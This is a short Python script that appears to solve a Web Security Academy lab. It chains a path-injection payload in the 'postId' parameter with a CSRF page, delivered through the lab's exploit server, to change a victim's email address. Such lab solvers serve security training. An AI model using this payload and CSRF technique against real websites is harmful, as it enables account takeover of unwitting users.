from web_security_academy.core.utils import generate_csrf_html

from urllib.parse import urljoin
from requests import Request
from time import sleep


def solve_lab(session):
    # Explanation: The path "/post/comment/confirmation" uses the "postId"
    # parameter to redirect the browser to "/post/<postId>". However, the
    # "postId" parameter isn't sanitized, making the endpoint vulnerabile to a
    # path injection attack. I use this endpoint to redirect the victim's
    # browser to an endpoint that changes the user's email.

    req = Request(
        "GET",
        urljoin(session.url, "/post/comment/confirmation"),
        params={"postId": "../my-account/change-email?email=user@example.com&submit=1"},
    )

    exploit_server = session.exploit_server()
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    body = generate_csrf_html(req)
    exploit_server.deliver_exploit_to_victim("/exploit", headers, body)

    # Wait for the client to get redirected
    sleep(3)
